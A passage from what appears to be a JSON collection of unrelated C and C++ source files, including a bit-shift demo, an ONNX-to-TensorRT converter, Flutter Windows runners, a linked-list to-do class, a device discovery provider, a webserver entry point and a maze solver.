16; ++i) {\n        result += (i == highlightIndex1 || i == highlightIndex2)\n                      ? color(to_string(array[i]), RED_COLOR)\n                      : to_string(array[i]);\n        result += \" \"; // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043f\u0440\u043e\u0431\u0435\u043b \u043c\u0435\u0436\u0434\u0443 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\u043c\u0438\n    }\n    return result;\n}\n\nvector<int> cyclicShiftArray(const vector<int> &binaryArray) {\n    vector<int> shiftedArray(16);\n    for (int i = 0, j = 0; i < 16; ++i) {\n        if (i == HL_1 || i == HL_2) {\n            shiftedArray[i] = binaryArray[i];\n        } else {\n            shiftedArray[i] = binaryArray[(j - 2 + 16) % 16];\n            ++j;\n        }\n    }\n    return shiftedArray;\n}\n\nstring outputShiftedArray(const vector<int> &shiftedArray) {\n    string result;\n    for (const auto &bit: shiftedArray) result += to_string(bit) + \" \";\n    result += \"\\n\";\n    return result;\n}\n\npair<vector<int>, vector<int> > splitAndOutputBytes(const vector<int> &shiftedArray) {\n    vector<int> firstByte(shiftedArray.begin(), shiftedArray.begin() + 8);\n    vector<int> secondByte(shiftedArray.begin() + 8, shiftedArray.end());\n\n    cout << color(\"First byte: \", CYAN_COLOR);\n    for (const auto &bit: firstByte) cout << bit;\n    cout << \" (\" << accumulate(firstByte.begin(), firstByte.end(), 0,\n                               [](const int acc, const int bit) { return (acc << 1) | bit; })\n            << \")\" << endl;\n\n    cout << color(\"Second byte: \", CYAN_COLOR);\n    for (const auto &bit: secondByte) cout << bit;\n    cout << \" (\" << accumulate(secondByte.begin(), secondByte.end(), 0,\n                               [](const int acc, const int bit) { return (acc << 1) | bit; }) << \")\" << endl;\n\n    return {firstByte, secondByte};\n}\n\nvoid outputSumOfBytes(const vector<int> &firstByte, const vector<int> &secondByte) {\n    const int sum = accumulate(firstByte.begin(), firstByte.end(), 0,\n                               [](const int acc, const int bit) { return (acc << 1) | bit; }) +\n                    accumulate(secondByte.begin(), secondByte.end(), 0, [](const int acc, const int bit) {\n                        return (acc << 1) | bit;\n                    });\n\n    cout << \"Sum of bytes: \" << sum << \" (\" << decimalToBinary(sum) << \")\" << endl;\n}\n\nint main() {\n    const vector<int> bytes = getUserInput();\n\n    cout << \"Entered bytes: \" << bytes[0] << \" (\" << decimalToBinary(bytes[0]) << \"), \"\n            << bytes[1] << \" (\" << decimalToBinary(bytes[1]) << \")\" << endl;\n\n    const vector<int> binaryArray = combineBytesToBinaryArray(bytes);\n    cout << \"Combined binary array: \" << getHighlightedArray(binaryArray, HL_1, HL_2) << endl;\n\n    const vector<int> shiftedArray = cyclicShiftArray(binaryArray);\n    cout << \"Array after cyclic shift right by 2: \" << getHighlightedArray(shiftedArray, HL_1, HL_2) << endl; // And here\n\n    auto [firstByte, secondByte] = splitAndOutputBytes(shiftedArray);\n    outputSumOfBytes(firstByte, secondByte);\n\n    return 0;\n}\n",
    "//\n// Created by dpw on 24-2-29.\n//\n\n#include \"vector\"\n#include <numeric>\n#include \"NvInfer.h\"\n#include \"NvOnnxParser.h\"\n#include \"NvInferPlugin.h\"\n#include \"device_launch_parameters.h\"\n#include \"NvInferVersion.h\"\n#include \"NvInferRuntimeCommon.h\"\n#include \"spdlog/spdlog.h\"\n#include \"fstream\"\n#include \"ostream\"\n#include \"iostream\"\n#include <cuda_runtime.h>\n\n#include \"logger.h\"\n#include \"cmdline.h\"\n#include \"common_utils.h\"\n#include \"yolov5_trt_calibrator.h\"\n\nusing namespace nvinfer1;\nusing namespace nvonnxparser;\n\n#if NV_TENSORRT_MAJOR <= 7\n/**\n * @brief \u8fd9\u662fONNX\u8f6cTensorRT\u6a21\u578b\u7684\u51fd\u6570,\u652f\u6301TensorRT7\u53ca\u5176\u66f4\u4f4e\u7248\u672cAPI\n * @param onnx_model_path onnx\u6a21\u578b\u8def\u5f84\n * @param tensorrt_model_path tensorrt\u6a21\u578b\u8def\u5f84\n * @param gpu_device_id gpu\u8bbe\u5907\u53f7\n * @param int8_calibrator INT8\u6821\u51c6\u7c7b\n * @return \u8fd4\u56de\u662f\u5426\u6210\u529f\u751f\u6210tensorrt\u6a21\u578b\u5e03\u5c14\u91cf\n */\nbool onnx2tensorrt_v7(std::string onnx_model_path, std::string tensorrt_model_path,\n                      int gpu_device_id,std::string mode,nvinfer1::IInt8EntropyCalibrator2* int8_calibrator)\n{\n    Logger logger(Severity::kVERBOSE);\n    // \u8bbe\u7f6e\u663e\u5361\u548c\u52a0\u8f7dTensorRT\u9ed8\u8ba4\u63d2\u4ef6\n    cudaSetDevice(gpu_device_id);\n    initLibNvInferPlugins(&logger, \"\");\n    spdlog::info(\"Start generating tensorRT model\");\n\n\n    // \u521b\u5efaONNX\u6a21\u578b\u89e3\u6790\u7c7b\u5b9e\u4f8b\n    NetworkDefinitionCreationFlags flags=1;\n    IBuilder* builder = createInferBuilder(logger);\n    INetworkDefinition* network = builder->createNetworkV2(flags);\n    // parse the caffe model to populate the network, then set the outputs\n    IParser* parser = createParser(*network, logger);\n\n    // \u521d\u59cb\u5316\u6a21\u578b\u7cbe\u5ea6\u6807\u5fd7\u4f4d\n    bool use_fp16 = builder->platformHasFastFp16() && (mode == \"fp16\");\n    bool use_int8 = builder->platformHasFastInt8() && (mode == \"int8\");\n\n    // \u89e3\u6790ONNX\u6a21\u578b\n    spdlog::info(\"parsing onnx model\");\n    bool parsed = parser->parseFromFile(onnx_model_path.c_str(),2);\n    if (!parsed){\n        spdlog::error(\"Parse failure\");\n        return false;          // \u89e3\u6790onnx\u6587\u4ef6\u5931\u8d25\uff0c\u8fd4\u56defalse\n    }\n\n    // \u521b\u5efatensorRT\u5f15\u64ce\n    builder->setMaxWorkspaceSize(1 << 30);          // \u8bbe\u7f6e\u6700\u5927\u7a7a\u95f4\n    if(use_int8){\n        spdlog::info(\"generating INT8 tensorRT model\");\n        builder->setInt8Mode(true);\n        builder->setInt8Calibrator(int8_calibrator);\n    }else if(use_fp16){           // \u8bbe\u7f6eFP16\u7cbe\u5ea6\u91cf\u5316\n        spdlog::info(\"generating FP16 tensorRT model\");\n        builder->setFp16Mode(true);\n    }else{                 // FP32\u7cbe\u5ea6\u91cf\u5316\n        spdlog::info(\"generating FP32 tensorRT model\");\n    }\n    ICudaEngine* engine = builder->buildCudaEngine(*network);\n    if(engine == nullptr){\n        spdlog::error(\"ERROR ONNX To TensorRT Model\" );\n    }\n    assert(engine);\n\n    // \u5f15\u64ce\u5e8f\u5217\u5316\uff0c\u4fdd\u5b58\u4e3a\u6587\u4ef6\n    std::ofstream tensorrt_file(tensorrt_model_path, std::ios::binary);\n    if (!tensorrt_file){\n        spdlog::error(\"could not open plan output file\");\n        return false;       // \u65e0\u6cd5\u6253\u5f00tensorRT\u6a21\u578b\uff0c\u8fd4\u56defalse\n    }\n    IHostMemory *ptr = engine->serialize();\n    assert(ptr);\n    tensorrt_file.write(reinterpret_cast<const char*>(ptr->data()), ptr->size());   // \u751f\u6210\u8f66\u724cOCR\u6a21\u578b\u7684tensorRT\u6587\u4ef6\n    tensorrt_file.close();\n    spdlog::info(\"Finish generating tensorRT model,tensorrt model saved in {}\",tensorrt_model_path);\n\n    // \u91ca\u653e\u5185\u5b58\u7a7a\u95f4\n    delete ptr;\n    delete engine;\n    delete config;\n    delete parser;\n    delete network;\n    delete builder;\n\n    return true;\n}\n#else\n/**\n * @brief \u8fd9\u662fONNX\u8f6cTensorRT\u6a21\u578b\u7684\u51fd\u6570,\u652f\u6301TensorRT\uff18\u53ca\u5176\u66f4\u9ad8\u7248\u672cAPI\n * @param onnx_model_path onnx\u6a21\u578b\u8def\u5f84\n * @param tensorrt_model_path tensorrt\u6a21\u578b\u8def\u5f84\n * @param gpu_device_id gpu\u8bbe\u5907\u53f7\n * @param mode tensorrt\u6a21\u578b\u7cbe\u5ea6\n * @param int8_calibrator INT8\u6821\u51c6\u7c7b\n * @return \u8fd4\u56de\u662f\u5426\u6210\u529f\u751f\u6210tensorrt\u6a21\u578b\u5e03\u5c14\u91cf\n */\nbool onnx2tensorrt_v8(std::string onnx_model_path, std::string tensorrt_model_path,\n                      int gpu_device_id,std::string mode,nvinfer1::IInt8EntropyCalibrator2* int8_calibrator) {\n    Logger logger(Severity::kVERBOSE);\n    // \u8bbe\u7f6e\u663e\u5361\u548c\u52a0\u8f7dTensorRT\u9ed8\u8ba4\u63d2\u4ef6\n    cudaSetDevice(gpu_device_id);\n    initLibNvInferPlugins(&logger, \"\");\n//    std::cout<<\"Start generating tensorRT model\"<<std::endl;\n    spdlog::info(\"Start generating tensorRT model\");\n\n    // \u521b\u5efaONNX\u6a21\u578b\u89e3\u6790\u7c7b\u5b9e\u4f8b\n    NetworkDefinitionCreationFlags flags=1;\n    IBuilder* builder = createInferBuilder(logger);\n    INetworkDefinition* network = builder->createNetworkV2(flags);\n    IBuilderConfig* config = builder->createBuilderConfig();\n    // parse the caffe model to populate the network, then set the outputs\n    IParser* parser = createParser(*network, logger);\n\n    // \u521d\u59cb\u5316\u6a21\u578b\u7cbe\u5ea6\u6807\u5fd7\u4f4d\n    bool use_fp16 = builder->platformHasFastFp16() && (mode == \"fp16\");\n    bool use_int8 = builder->platformHasFastInt8() && (mode == \"int8\");\n\n    // \u89e3\u6790ONNX\u6a21\u578b\n    spdlog::info(\"Parsing ONNX model\");\n    bool parsed = parser->parseFromFile(onnx_model_path.c_str(),4);\n    if (!parsed){\n        std::cerr << \"Parse failure\" << std::endl;\n        spdlog::error(\"Parse failure\");\n        return false;          // \u89e3\u6790onnx\u6587\u4ef6\u5931\u8d25\uff0c\u8fd4\u56defalse\n    }\n\n    // \u521b\u5efatensorRT\u5f15\u64ce\n//    config->setMaxWorkspaceSize(1 << 30 );          // \u8bbe\u7f6e\u6700\u5927\u7a7a\u95f4,1G\n    config->setMaxWorkspaceSize(256*(1 << 30 ));          // \u8bbe\u7f6e\u6700\u5927\u7a7a\u95f4,256M\n    if(use_int8){\n        spdlog::info(\"generating INT8 te",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"quiz_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"TO_DO_LIST.h\"\r\n#include <iostream>\r\nusing namespace std;\r\n// Constructor\r\nsortedlinkedlist::sortedlinkedlist()\r\n{\r\n\tlistdata = nullptr;\r\n}\r\n// Insert method\r\nvoid sortedlinkedlist::insert(const string& task) {\r\n\tnode* temp = listdata;\r\n\tnode* t = nullptr; // Initialize t to nullptr\r\n\twhile (temp != nullptr)\r\n\t{\r\n\t\tif (task < temp->info)\r\n\t\t\tbreak;\r\n\t\tt = temp;\r\n\t\ttemp = temp->next;\r\n\t}\r\n\tnode* location = new node;\r\n\tlocation->info = task;\r\n\tlocation->isDone = false; // Default to not done\r\n\tif (temp == listdata)\r\n\t{\r\n\t\tlocation->next = listdata;\r\n\t\tlistdata = location;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tt->next = location;\r\n\t\tlocation->next = temp;\r\n\t}\r\n}\r\n// Search method\r\nbool sortedlinkedlist::search(const string& task) const {\r\n\tnode* temp = listdata;\r\n\twhile (temp != nullptr)\r\n\t{\r\n\t\tif (task == temp->info)\r\n\t\t\treturn true;\r\n\t\ttemp = temp->next;\r\n\t}\r\n\treturn false;\r\n}\r\n// Delete method\r\nvoid sortedlinkedlist::del(const string& task) {\r\n\tnode* temp = listdata;\r\n\tnode* t = nullptr;\r\n\twhile (temp != nullptr)\r\n\t{\r\n\t\tif (task == temp->info)\r\n\t\t\tbreak;\r\n\t\tt = temp;\r\n\t\ttemp = temp->next;\r\n\t}\r\n\tif (temp == listdata)\r\n\t{\r\n\t\tlistdata = listdata->next;\r\n\t\tdelete temp;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tif (temp != nullptr)\r\n\t\t{\r\n\t\t\tt->next = temp->next;\r\n\t\t\tdelete temp;\r\n\t\t}\r\n\t}\r\n}\r\n// Make empty method\r\nvoid sortedlinkedlist::makeempty() {\r\n\tnode* temp;\r\n\twhile (listdata != nullptr)\r\n\t{\r\n\t\ttemp = listdata;\r\n\t\tlistdata = listdata->next;\r\n\t\tdelete temp;\r\n\t}\r\n}\r\n// Get length method\r\nint sortedlinkedlist::getlength() const {\r\n\tnode* temp = listdata;\r\n\tint count = 0;\r\n\twhile (temp != nullptr)\r\n\t{\r\n\t\tcount++;\r\n\t\ttemp = temp->next;\r\n\t}\r\n\treturn count;\r\n}\r\n// Display method\r\nvoid sortedlinkedlist::display() const {\r\n\tif (listdata == nullptr)\r\n\t{\r\n\t\tcout << \" list is empty\" << endl;\r\n\t}\r\n\tnode* temp = listdata;\r\n\twhile (temp != nullptr)\r\n\t{\r\n\t\tcout << temp->info << \" [\" << (temp->isDone ? \"done\" : \"not done\")\r\n\t\t\t<< \"]\" << endl;\r\n\t\ttemp = temp->next;\r\n\t}\r\n}\r\n// Is full method\r\nbool sortedlinkedlist::isfull() const {\r\n\tnode* temp;\r\n\ttry\r\n\t{\r\n\t\ttemp = new node;\r\n\t\tdelete temp;\r\n\t\treturn false;\r\n\t}\r\n\tcatch (bad_alloc exception)\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n}\r\n// Add task method\r\nvoid sortedlinkedlist::addTask(const string& task) {\r\n\tinsert(task);\r\n}\r\n// Remove task method\r\nvoid sortedlinkedlist::removeTask(const string& task) {\r\n\tdel(task);\r\n}\r\n// Display tasks method\r\nvoid sortedlinkedlist::displayTasks() const {\r\n\tdisplay();\r\n}\r\n// Check if task is done method\r\nbool sortedlinkedlist::isTaskDone(const string& task) const {\r\n\t\r\n\tnode* temp = listdata;\r\n\twhile (temp != nullptr)\r\n\t{\r\n\t\tif (task == temp->info)\r\n\t\t\treturn temp->isDone;\r\n\t\ttemp = temp->next;\r\n\t}\r\n\treturn false;\r\n}\r\n// Mark task as done method\r\nvoid sortedlinkedlist::markTaskDone(const string& task) {\r\n\t\r\n\tnode* temp = listdata;\r\n\twhile (temp != nullptr)\r\n\t{\r\n\t\tif (task == temp->info)\r\n\t\t{\r\n\t\t\ttemp->isDone = true;\r\n\t\t\treturn;\r\n\t\t}\r\n\t\ttemp = temp->next;\r\n\t}\r\n\tcout << \"Task not found: \" << task << endl;\r\n}\r\nvoid sortedlinkedlist::counttasksdone() {\r\n\tif (listdata == nullptr)\r\n\t{\r\n\t\tcout << \" list is empty\" << endl;\r\n\t\treturn;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tnode* temp = listdata;\r\n\t\tint count = 0;\r\n\t\twhile (temp != nullptr)\r\n\t\t{\r\n\t\t\tcount++;\r\n\t\t\ttemp = temp->next;\r\n\r\n\t\t}\r\n\t\tcout << \" count of tasks = \" << count << endl;\r\n\t}\r\n\r\n}\r\n// Display uncompleted tasks method\r\nvoid sortedlinkedlist::displayUncompletedTasks() const {\r\n\tnode* temp = listdata;\r\n\twhile (temp != nullptr) {\r\n\t\tif (!temp->isDone) {\r\n\t\t\tcout << temp->info << \" [not done]\" << endl;\r\n\t\t}\r\n\t\ttemp = temp->next;\r\n\t}\r\n}\r\n\r\n\r\n",
    "#include \"api.h\"\n#include \"./deviceprovider.h\"\n#include \"../devices/api_devicemanager.h\"\n\nextern PMPDevicePlugin plugin;\nbool ConnectDrive(wchar_t drive, bool connect);\n\nstatic size_t tlsIndex = (size_t)-1;\n\nstatic BOOL \nDiscoveryProvider_RegisterCancelSwitch(BOOL *cancelSwitch)\n{\n\tif ((size_t)-1 != tlsIndex && \n\t\tNULL != WASABI_API_APP)\n\t{\n\t\tWASABI_API_APP->SetThreadStorage(tlsIndex, cancelSwitch);\n\t\treturn TRUE;\n\t}\n\n\treturn FALSE;\n}\n\nstatic BOOL \nDiscoveryProvider_GetCancelSwitchOn()\n{\n\tif ((size_t)-1 != tlsIndex && \n\t\tNULL != WASABI_API_APP)\n\t{\n\t\tBOOL *cancelSwitch = (BOOL*)WASABI_API_APP->GetThreadStorage(tlsIndex);\n\t\tif (NULL != cancelSwitch && \n\t\t\tFALSE != *cancelSwitch)\n\t\t{\n\t\t\treturn TRUE;\n\t\t}\n\t}\n\treturn FALSE;\n}\n\nstatic void\nDeviceProvider_DriverEnumCb(wchar_t drive, unsigned int type)\n{\n\tif (DRIVE_REMOVABLE == type &&\n\t\tFALSE == DiscoveryProvider_GetCancelSwitchOn())\n\t{\n\t\tConnectDrive(drive,true);\n\t}\n}\n\nDeviceProvider::DeviceProvider()\n\t: ref(1), activity(0), manager(NULL), readyEvent(NULL), cancelDiscovery(FALSE)\n{\n\tInitializeCriticalSection(&lock);\n\tenumerator = (ENUMDRIVES)SendMessageW(plugin.hwndPortablesParent, \n\t\t\t\t\t\t\t\tWM_PMP_IPC, 0, PMP_IPC_ENUM_ACTIVE_DRIVES);\n}\n\nDeviceProvider::~DeviceProvider()\n{\n\tCancelDiscovery();\n\n\tif (NULL != readyEvent)\n\t\tCloseHandle(readyEvent);\n\n\tDeleteCriticalSection(&lock);\n}\n\nHRESULT DeviceProvider::CreateInstance(DeviceProvider **instance)\n{\n\tif (NULL == instance) \n\t\treturn E_POINTER;\n\n\t*instance = new DeviceProvider();\n\n\tif (NULL == *instance) \n\t\treturn E_OUTOFMEMORY;\n\n\treturn S_OK;\n}\n\nsize_t DeviceProvider::AddRef()\n{\n\treturn InterlockedIncrement((LONG*)&ref);\n}\n\nsize_t DeviceProvider::Release()\n{\n\tif (0 == ref)\n\t\treturn ref;\n\t\n\tLONG r = InterlockedDecrement((LONG*)&ref);\n\tif (0 == r)\n\t\tdelete(this);\n\t\n\treturn r;\n}\n\nint DeviceProvider::QueryInterface(GUID interface_guid, void **object)\n{\n\tif (NULL == object) \n\t\treturn E_POINTER;\n\t\n\tif (IsEqualIID(interface_guid, IFC_DeviceProvider))\n\t\t*object = static_cast<ifc_deviceprovider*>(this);\n\telse\n\t{\n\t\t*object = NULL;\n\t\treturn E_NOINTERFACE;\n\t}\n\n\tif (NULL == *object)\n\t\treturn E_UNEXPECTED;\n\n\tAddRef();\n\treturn S_OK;\n}\n\nvoid DeviceProvider::Lock()\n{\n\tEnterCriticalSection(&lock);\n}\n\nvoid DeviceProvider::Unlock()\n{\n\tLeaveCriticalSection(&lock);\n}\n\nDWORD DeviceProvider::DiscoveryThread()\n{\n\tIncrementActivity();\n\n\tif (NULL != enumerator && \n\t\tFALSE == cancelDiscovery)\n\t{\n\t\tDiscoveryProvider_RegisterCancelSwitch(&cancelDiscovery);\n\n\t\tenumerator(DeviceProvider_DriverEnumCb);\n\n\t\tDiscoveryProvider_RegisterCancelSwitch(NULL);\n\t}\n\n\tDecrementActivity();\n\n\tLock();\n\t\n\tif (NULL != readyEvent)\n\t\tSetEvent(readyEvent);\n\n\tUnlock();\n\n\t\n\treturn 0;\n}\n\nstatic int DeviceProvider_DiscoveryThreadStarter(HANDLE handle, void *user, intptr_t id)\n{\n\tDeviceProvider *self;\n\tDWORD result;\n\t\t\n\tself = (DeviceProvider*)user;\n\t\t\t\n\tif (NULL != self)\n\t\tresult = self->DiscoveryThread();\n\telse\n\t\tresult = -2;\n\n\treturn result;\n}\n\nHRESULT DeviceProvider::BeginDiscovery(api_devicemanager *manager)\n{\n\tHRESULT hr;\n\t\n\tif (NULL == enumerator)\n\t\treturn E_UNEXPECTED;\n\n\tLock();\n\n\tif (NULL != readyEvent && \n\t\tWAIT_TIMEOUT == WaitForSingleObject(readyEvent, 0))\n\t{\n\t\thr = E_PENDING;\n\t}\n\telse\n\t{\n\t\thr = S_OK;\n\t\t\n\t\tif (NULL == readyEvent)\n\t\t{\n\t\t\treadyEvent = CreateEvent(NULL, TRUE, TRUE, NULL);\n\t\t\tif (NULL == readyEvent)\n\t\t\t\thr = E_FAIL;\n\t\t}\n\n\t\tif ((size_t)-1 == tlsIndex && \n\t\t\tNULL != WASABI_API_APP)\n\t\t{\n\t\t\ttlsIndex = WASABI_API_APP->AllocateThreadStorage();\n\t\t}\n\n\t\tif (SUCCEEDED(hr))\n\t\t{\n\t\t\t\n\t\t\tcancelDiscovery = FALSE;\n\t\t\tResetEvent(readyEvent);\n\t\t\t\n\t\t\tif (0 != WASABI_API_THREADPOOL->RunFunction(0, DeviceProvider_DiscoveryThreadStarter, \n\t\t\t\t\t\t\t\t\tthis, 0, api_threadpool::FLAG_LONG_EXECUTION))\n\t\t\t{\n\n\t\t\t\tSetEvent(readyEvent);\n\t\t\t\thr = E_FAIL;\n\t\t\t}\n\t\t}\n\t}\n\n\tUnlock();\n\n\treturn hr;\n}\n\nHRESULT DeviceProvider::CancelDiscovery()\n{\n\tHRESULT hr;\n\n\thr = S_FALSE;\n\n\tLock();\n\t\n\tif (NULL != readyEvent)\n\t{\n\t\tcancelDiscovery = TRUE;\n\t\tif (WAIT_OBJECT_0 == WaitForSingleObject(readyEvent, 0))\n\t\t\thr = S_OK;\n\n\t\tcancelDiscovery = FALSE;\n\t}\n\n\tUnlock();\n\t\n\treturn hr;\n}\n\nHRESULT DeviceProvider::GetActive()\n{\n\tHRESULT hr;\n\n\tLock();\n\t\n\tif (0 != activity)\n\t\thr = S_OK;\n\telse\n\t\thr = S_FALSE;\n\n\tUnlock();\n\n\treturn hr;\n}\n\nHRESULT DeviceProvider::Register(api_devicemanager *manager)\n{\n\tHRESULT hr;\n\n\tif (NULL != this->manager)\n\t\treturn E_UNEXPECTED;\n\n\tif (NULL == manager)\n\t\treturn E_POINTER;\n\n\thr = manager->RegisterProvider(this);\n\tif (SUCCEEDED(hr))\n\t{\n\t\tthis->manager = manager;\n\t\tmanager->AddRef();\n\t}\n\treturn hr;\n}\n\nHRESULT DeviceProvider::Unregister()\n{\n\tHRESULT hr;\n\n\tif (NULL == manager)\n\t\treturn E_UNEXPECTED;\n\n\thr = manager->UnregisterProvider(this);\n\tmanager->Release();\n\tmanager = NULL;\n\treturn hr;\n}\n\nsize_t DeviceProvider::IncrementActivity()\n{\n\tsize_t a;\n\n\tLock();\n\n\tactivity++;\n\tif (1 == activity && \n\t\tNULL != manager)\n\t{\n\t\tmanager->SetProviderActive(this, TRUE);\n\t}\n\t\n\ta = activity;\n\t\n\tUnlock();\n\n\treturn a;\n}\n\nsize_t DeviceProvider::DecrementActivity()\n{\n\tsize_t a;\n\n\tLock();\n\n\tif (0 != activity)\n\t{\n\t",
    "#include \"webserv.hpp\"\n#include \"Cluster.hpp\"\n\nint main(int argc, char **argv) {\n\tstd::string\tconf_path;\n\tint\t\t\ti = 0;\n\n\tif (argc > 2) {\n\t\tstd::cerr << \"Error: Wrong numbers of arguments\" << std::endl;\n\t\treturn 1;\n\t} else if (argc == 1)\n\t\tconf_path = \"./webserv.conf\";\n\telse\n\t\tconf_path = argv[1];\n\n\tt_cluster_config config;\n\ttry {\n\t\tconfig = Config::parseConfigFile(conf_path);\n\t\t// std::cout << config;\n\t} catch (std::exception &e) {\n\t\tstd::cerr << COL_RED << e.what() << COL_RESET << std::endl;\n\t\treturn 1;\n\t}\n\n\tinitializeCodesResponses();\n\tinitializeContentTypes();\n\n\twhile (i <= 3) {\n\t\tCluster cluster(config);\n\n\t\ttry {\n\t\t\tcluster.start();\n\t\t\treturn 0;\n\t\t} catch (std::runtime_error &e) {\n\t\t\tif (i == 3)\n\t\t\t\treturn 1;\n\t\t\t\n\t\t\tstd::cerr << std::string(\" \ud83d\udd34 [ERROR] \") + e.what() << std::endl << std::endl;\n\t\t\tstd::cout << \" \ud83d\udd35 [INFO] Restarting server ...\" << std::endl;\n\n\t\t\tcluster.closeCluster(true);\n\n\t\t} catch (std::logic_error &e) {\n\t\t\tcluster.closeCluster(false);\n\t\t\treturn 2;\n\t\t} catch (std::exception &e) {\n\t\t\tcluster.closeCluster(false);\n\t\t\treturn 1;\n\t\t}\n\t\t\n\t\ti++;\n\t}\n\n\treturn 0;\n}\n\n// #include \"Request.hpp\"\n\n// int main(void) {\n// \t// std::ofstream file(\"fichier.txt\");\n// \t// file << \"GET / HTTP/1.1\\r\\nContent-Type: application/json\\r\\nUser-Agent: PostmanRuntime/7.28.3\\r\\nAccept: */*\\r\\nCache-Control: no-Cache\\r\\nPostman-Token: 8328391905\\r\\nHost:jsonplaceholder.typicode.com\\r\\nAccept-Encoding: gzip,deflate,br\\r\\nConnection: keep-alive\\r\\nContent-Length: 56\\r\\n\\r\\n{\\r\\n  \\\"title\\\":\\\"foo\\\",\\r\\n  \\\"body\\\":\\\"bar\\\",\\r\\n  \\\"userId\\\":1\\r\\n}ubuvbgvgvgvugvgvugvuvuvbuvbyuvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv\\r\\n\";\n// \t// file.close();\n// \t// return 0;\n\n// \tt_cluster_config config = parseConfigFile(\"./webserv.conf\");\n// \tServer server = config.servers[0];\n\n// \tint fd = open(\"fichier.txt\", O_RDONLY);\n// \tif (fd < 0) {\n// \t\tstd::cerr << \"ERROR\" << std::endl;\n// \t\treturn 1;\n// \t}\n// \tRequest request(fd, server);\n\n// \tstd::cout << \"Method: \" << request.getMethod() << std::endl;\n// \tstd::cout << \"Target file: \" << request.getTargetFile() << std::endl;\n// \tstd::cout << \"Headers: \" << std::endl;\n\n// \tstd::map<std::string, std::string> headers = request.getHeaders();\n// \tstd::map<std::string, std::string>::const_iterator it = headers.begin();\n// \tstd::map<std::string, std::string>::const_iterator end = headers.end();\n\n// \tfor (; it != end; it++)\n// \t\tstd::cout << \"\\t\" << (*it).first << \":\" << (*it).second << std::endl;\n\n// \tstd::cout << \"Body: \" << request.getBody() << std::endl;\n// \tstd::cout << \"Response code: \" << request.getResCode() << std::endl;\n// \tstd::cout << \"Response: \" << request.getResponse() << std::endl;\n\n// \treturn 0;\n// }\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"rescue_now_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <utility>\n#include <string>\n#include <stdexcept>\n\n// Define a type alias for clarity\nusing Point = std::pair<int, int>;\n\n// Directions for movement in the maze\nconst std::vector<Point> dir = {\n    {0, -1},  // Up\n    {1, 0},   // Right\n    {0, 1},   // Down\n    {-1, 0}   // Left\n};\n\n// Function to find the position of a target character in the maze\nPoint findPosition(const std::vector<std::string>& maze, char target) {\n    for (size_t y = 0; y < maze.size(); ++y) {\n        for (size_t x = 0; x < maze[y].length(); ++x) {\n            if (maze[y][x] == target) {\n                return { static_cast<int>(x), static_cast<int>(y) };\n            }\n        }\n    }\n    throw std::runtime_error(\"Target not found in maze\");\n}\n\n// Recursive function to solve the maze\nbool walk(\n    const std::vector<std::string>& maze,\n    char wall,\n    Point curr,\n    Point end,\n    std::vector<std::vector<bool>>& seen,\n    std::vector<Point>& path\n) {\n    // Check if current position is out of bounds, wall, or already visited\n    if (curr.first < 0 || curr.first >= maze[0].size() ||\n        curr.second < 0 || curr.second >= maze.size() ||\n        maze[curr.second][curr.first] == wall ||\n        seen[curr.second][curr.first]) {\n        return false;\n    }\n\n    // If we've reached the end, add it to the path and return success\n    if (curr == end) {\n        path.push_back(curr);\n        return true;\n    }\n\n    // Mark current position as seen\n    seen[curr.second][curr.first] = true;\n    path.push_back(curr);\n\n    // Try all four directions\n    for (const auto& d : dir) {\n        Point next(curr.first + d.first, curr.second + d.second);\n        if (walk(maze, wall, next, end, seen, path)) {\n            return true;\n        }\n    }\n\n    // If no path found, backtrack\n    path.pop_back();\n    return 